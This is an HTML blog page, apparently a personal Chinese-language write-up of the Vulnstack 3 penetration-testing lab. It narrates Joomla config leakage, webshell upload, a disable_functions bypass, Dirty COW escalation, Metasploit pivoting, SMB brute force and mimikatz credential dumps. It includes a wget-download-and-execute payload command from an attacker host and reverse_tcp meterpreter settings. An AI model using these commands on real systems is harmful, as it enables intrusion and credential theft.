@@ -1,0 +1,375 @@
+<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>vulstrack(三)挨打实录 | Pale</title><meta name="keywords" content="渗透测试"><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulstrack（三） 挨打实录 ip：http:&#x2F;&#x2F;10.203.87.242&#x2F;  开局一个joomla 百度搜了下家谱  直接开盒   扫下   端口   扫下  目录     御剑用一半怕崩 找个工具  joomscan  工具扫到挺多 主要这个配置文件 里边有密钥 和数据库账号密码  http:&#x2F;&#x2F;10.203.87.242&#x2F;configuration.php~  1è¯·ç¨å€™è">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulstrack(三)挨打实录">
+<meta property="og:url" content="http://example.com/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/index.html">
+<meta property="og:site_name" content="Pale">
+<meta property="og:description" content="vulstrack（三） 挨打实录 ip：http:&#x2F;&#x2F;10.203.87.242&#x2F;  开局一个joomla 百度搜了下家谱  直接开盒   扫下   端口   扫下  目录     御剑用一半怕崩 找个工具  joomscan  工具扫到挺多 主要这个配置文件 里边有密钥 和数据库账号密码  http:&#x2F;&#x2F;10.203.87.242&#x2F;configuration.php~  1è¯·ç¨å€™è">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-11-19T09:36:11.000Z">
+<meta property="article:modified_time" content="2021-11-19T09:41:04.160Z">
+<meta property="article:author" content="One">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulstrack(三)挨打实录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: false,
+  postUpdate: '2021-11-19 17:41:04'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulstrack(三)挨打实录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-11-19T09:36:11.000Z" title="Created 2021-11-19 17:36:11">2021-11-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-11-19T09:41:04.160Z" title="Updated 2021-11-19 17:41:04">2021-11-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulstrack(三)挨打实录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>vulstrack（三）</p>
+<p>挨打实录</p>
+<p>ip：<a target="_blank" rel="noopener" href="http://10.203.87.242/">http://10.203.87.242/</a> </p>
+<p>开局一个joomla 百度搜了下家谱  直接开盒</p>
+<p><img src="image-20211118140446126.png" alt="image-20211118140446126"></p>
+<p> 扫下   端口   扫下  目录</p>
+<p><img src="image-20211118152707664.png" alt="image-20211118152707664"></p>
+<p><img src="image-20211118153756313.png" alt="image-20211118153756313"></p>
+<p><img src="image-20211118154240878.png" alt="image-20211118154240878"></p>
+<p><img src="image-20211118155923176.png" alt="image-20211118155923176"></p>
+<p>御剑用一半怕崩 找个工具  joomscan  工具扫到挺多</p>
+<p>主要这个配置文件 里边有密钥 和数据库账号密码 </p>
+<p><code>http://10.203.87.242/configuration.php~</code></p>
+<p><img src="image-20211118162342980.png" alt="image-20211118162342980"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·ç¨å€™è®¿é—®ã€‚&#x27;; public $display_offline_message = &#x27;1&#x27;; public $offline_image = &#x27;&#x27;; public $sitename = &#x27;test&#x27;; public $editor = &#x27;tinymce&#x27;; public $captcha = &#x27;0&#x27;; public $list_limit = &#x27;20&#x27;; public $access = &#x27;1&#x27;; public $debug = &#x27;0&#x27;; public $debug_lang = &#x27;0&#x27;; public $debug_lang_const = &#x27;1&#x27;; public $dbtype = &#x27;mysqli&#x27;; public $host = &#x27;localhost&#x27;; public $user = &#x27;testuser&#x27;; public $password = &#x27;cvcvgjASD!@&#x27;; public $db = &#x27;joomla&#x27;; public $dbprefix = &#x27;am2zu_&#x27;; public $live_site = &#x27;&#x27;; public $secret = &#x27;gXN9Wbpk7ef3A4Ys&#x27;; public $gzip = &#x27;0&#x27;; public $error_reporting = &#x27;default&#x27;; public $helpurl = &#x27;https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;&#x27;; public $ftp_host = &#x27;&#x27;; public $ftp_port = &#x27;&#x27;; public $ftp_user = &#x27;&#x27;; public $ftp_pass = &#x27;&#x27;; public $ftp_root = &#x27;&#x27;; public $ftp_enable = &#x27;0&#x27;; public $offset = &#x27;UTC&#x27;; public $mailonline = &#x27;1&#x27;; public $mailer = &#x27;mail&#x27;; public $mailfrom = &#x27;test@test.com&#x27;; public $fromname = &#x27;test&#x27;; public $sendmail = &#x27;/usr/sbin/sendmail&#x27;; public $smtpauth = &#x27;0&#x27;; public $smtpuser = &#x27;&#x27;; public $smtppass = &#x27;&#x27;; public $smtphost = &#x27;localhost&#x27;; public $smtpsecure = &#x27;none&#x27;; public $smtpport = &#x27;25&#x27;; public $caching = &#x27;0&#x27;; public $cache_handler = &#x27;file&#x27;; public $cachetime = &#x27;15&#x27;; public $cache_platformprefix = &#x27;0&#x27;; public $MetaDesc = &#x27;&#x27;; public $MetaKeys = &#x27;&#x27;; public $MetaTitle = &#x27;1&#x27;; public $MetaAuthor = &#x27;1&#x27;; public $MetaVersion = &#x27;0&#x27;; public $robots = &#x27;&#x27;; public $sef = &#x27;1&#x27;; public $sef_rewrite = &#x27;0&#x27;; public $sef_suffix = &#x27;0&#x27;; public $unicodeslugs = &#x27;0&#x27;; public $feed_limit = &#x27;10&#x27;; public $feed_email = &#x27;none&#x27;; public $log_path = &#x27;/var/www/html/administrator/logs&#x27;; public $tmp_path = &#x27;/var/www/html/tmp&#x27;; public $lifetime = &#x27;15&#x27;; public $session_handler = &#x27;database&#x27;; public $shared_session = &#x27;0&#x27;; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以连3306</p>
+<p><img src="image-20211118162420539.png" alt="image-20211118162420539"></p>
+<p>nice</p>
+<p><img src="image-20211118162526891.png" alt="image-20211118162526891"></p>
+<p>什么阴间密码 能不能自己创建一个 </p>
+<p><img src="image-20211118163059085.png" alt="image-20211118163059085"></p>
+<p>俩模板   用户创建错地方   纯纯slm了         </p>
+<p>哥斯拉还跑出来一个root密码</p>
+<p><img src="image-20211118170554998.png" alt="image-20211118170554998"></p>
+<p>mysql写马不管是 爆破出的root还是testuser没有权限</p>
+<p>百度复制了一个类似密码  直接改了超管密码  </p>
+<p>进入后台发现省去了添加后台超管的步骤 属于是快乐少一半 </p>
+<p>直接使用超级管理员用户，修改<code>Beez3</code>模板的<code>error.php</code>文件</p>
+<p>写入我的小摩托 </p>
+<p>传马一连   （1.php是phpinfo  2.php是预留后门  爆破可以上车）</p>
+<p><img src="image-20211118174154671.png" alt="image-20211118174154671"></p>
+<p>发现  需要         bypass disable_functions</p>
+<p>尝试执行命令，返回ret=127，</p>
+<p>应该是disable_functions的限制了</p>
+<p>通过phpinfo发现禁用了如下函数，目标是linux</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118183459566.png" alt="image-20211118183459566"></p>
+<p>百度了解到  这个 加上 没有禁用putenv函数，所以可以</p>
+<p><code>利用LD_PRELOAD绕过</code>这里需要学习 </p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118191853428.png" alt="image-20211118191853428">虽然是个低权  头一次这么绕过     忘了蚁剑还有个插件了 、、</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118201050708.png" alt="image-20211118201050708"></p>
+<p>上祖训  </p>
+<p><code>ifconfig </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.203.87.242/templates/beez3/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/smartb&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118192019962.png" alt="image-20211118192019962"></p>
+<p>查看ip信息，发现ip并不是<code>10.203.87.242 </code>是</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118192226867.png" alt="image-20211118192226867"></p>
+<p>这台是个<code>ubuntu </code>  由于知识浅陋 不是很了解端口映射 猜到是是反向代理   </p>
+<p>ubuntu应该是不出网的</p>
+<p>应该要拿centos的权限</p>
+<p>捣鼓半天  啥也没弄得到  乱翻var和   tmp找  找到敏感文件</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118195155510.png" alt="image-20211118195155510"></p>
+<p>这adduser是新增用户 </p>
+<p>Centos试试 ssh10.203.87.242连xshell </p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118200019099.png" alt="image-20211118200019099"></p>
+<p>又是  低权  吐了  （后来发现 可以爆破root密码  干）</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118200130214.png" alt="image-20211118200130214"></p>
+<p>传奇再现     一块 <code>10.203.87.242</code>  一块<code>192.168.93.100</code></p>
+<p>还得信息搜集一波  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[wwwuser@localhost ~]$ uname -a</span><br><span class="line">Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<p>又要 横向移动 </p>
+<p>centos也得 提权  因为只有他是出网机 </p>
+<p>需要把他作为横向移动的跳板  </p>
+<p>使用脏牛  范围 包括这个 centos</p>
+<p> 提权成功</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118205903081.png" alt="image-20211118205903081"></p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211118210008632.png" alt="image-20211118210008632"></p>
+<p>可以使用  frp 搭建隧道 时间久远  都快忘了 复习复习  </p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119144455252.png" alt="image-20211119144455252"></p>
+<p>或者 msf  天可怜见特意装了个msf5 终于上线  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Kali</span><br><span class="line"></span><br><span class="line">use web_delivery</span><br><span class="line">set target 6</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.203.87.193</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line">记得添加路由</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.203.87.242机器   </span><br><span class="line">wget -qO 8WMytsrE --no-check-certificate http://10.203.87.193:8080/2yJcTOurU6QbLBM; chmod +x 8WMytsrE; ./8WMytsrE&amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119152731995.png" alt="image-20211119152731995"></p>
+<p><code>search scanner/smb/smb_version</code></p>
+<p>发现3台windows，并且存在TEST域环境</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119153611258.png" alt="image-20211119153611258"></p>
+<p><code>scanner/smb/smb_login</code>爆破smb<code> 192.168.93.20</code></p>
+<p>这里  新装的kali 传文件是在费劲  假装爆破出来了  </p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119155642223.png" alt="image-20211119155642223"></p>
+<p>看超级无敌的husins的wp发现还可以爆破  暴力穷举  使用fscan</p>
+<p>下面  psexec登陆win2008</p>
+<p>meterpreter中进入shell</p>
+<p><code>ps</code>查看进程  2752 explor.exe的adminnistor格外深情</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119162931113.png" alt="image-20211119162931113"></p>
+<p>迁移到 administrator</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119162949151.png" alt="image-20211119162949151"></p>
+<p>这里不会用 现学</p>
+<p><code>load mimikatz</code></p>
+<p><code>kerberos</code></p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119162855197.png" alt="image-20211119162855197"></p>
+<p><code>msv</code></p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119163022698.png" alt="image-20211119163022698"></p>
+<p><code>ipconfig -all </code></p>
+<p><strong>定位到dns服务器为192.168.93.10，域名为test.org，一般dns服务器就是域控</strong></p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119163350139.png" alt="image-20211119163350139"></p>
+<p>进入shell信息收集  ping一下域控找ip</p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119164341610.png" alt="image-20211119164341610"></p>
+<p>网络拓补</p>
+<table>
+<thead>
+<tr>
+<th>ip</th>
+<th>系统</th>
+<th>任务</th>
+<th>权限</th>
+<th>端口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>192.168.93.10</td>
+<td>Windows Server 2012</td>
+<td>域控</td>
+<td></td>
+<td>88，135，445</td>
+</tr>
+<tr>
+<td>192.168.93.20</td>
+<td>Windows2008</td>
+<td></td>
+<td></td>
+<td>80、135、139、445、1433</td>
+</tr>
+<tr>
+<td>192.168.93.30</td>
+<td>windows7</td>
+<td></td>
+<td></td>
+<td>445，135</td>
+</tr>
+<tr>
+<td>192.168.93.100</td>
+<td>Centos</td>
+<td>出网机</td>
+<td></td>
+<td>22，80，3306</td>
+</tr>
+<tr>
+<td>192.168.93.120</td>
+<td>Ubuntu</td>
+<td>web服务</td>
+<td></td>
+<td>22，3306</td>
+</tr>
+</tbody></table>
+<p>ipc连接拿flag</p>
+<p>什么是IPC$: 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p>
+<blockquote>
+<p>又是新知识   </p>
+</blockquote>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119164629566.png" alt="image-20211119164629566"></p>
+<p><img src="vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/image-20211119165448194.png" alt="image-20211119165448194"></p>
+<p>反思：</p>
+<p>1：对于cms了解不多 joomla!这次是第一次见到 后台模板getshell的时候多少沾点笨，对于mysql管理工具的使用不够熟练 写mysql写shell不熟练 里边两套表加用户还上当了改错了user表  joomscan真好用  、</p>
+<p>2.bypassdisbale_functions 这个东西头一次 实际遇到 </p>
+<p>3.本机敏感文件搜集  能找到密码   挺多密码可以爆破  这个是 遗漏的地方  </p>
+<p>4.linux提权   脏牛的使用  和web_delivery模块 都是头一次用    其实frp啥的都行</p>
+<p>5.横向移动      <code> smb_version+smb_login</code>主机探测加爆破 有很多方法   fscan可行 别的都挺多</p>
+<p>6.psexec获取目标shell  mimikatz抓取明文密码  命令不会</p>
+<p>7.获取域控shell看到有人用impacket  没用明白  看大帅哥的wp学的ipc</p>
+<p>8.网络拓补很重要  一定要记得高低整明白 为啥下一步做什么  </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/">http://example.com/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">vulstrack（二）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/" title="vulstrack（二）"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-13</div><div class="title">vulstrack（二）</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/" title="vulstrack(三)挨打实录"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulstrack(三)挨打实录"/></a><div class="content"><a class="title" href="/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/" title="vulstrack(三)挨打实录">vulstrack(三)挨打实录</a><time datetime="2021-11-19T09:36:11.000Z" title="Created 2021-11-19 17:36:11">2021-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/" title="vulstrack（二）"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulstrack（二）"/></a><div class="content"><a class="title" href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/" title="vulstrack（二）">vulstrack（二）</a><time datetime="2021-11-13T05:09:04.000Z" title="Created 2021-11-13 13:09:04">2021-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/12/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2021/11/12/hello-world/" title="Hello World">Hello World</a><time datetime="2021-11-12T05:23:22.179Z" title="Created 2021-11-12 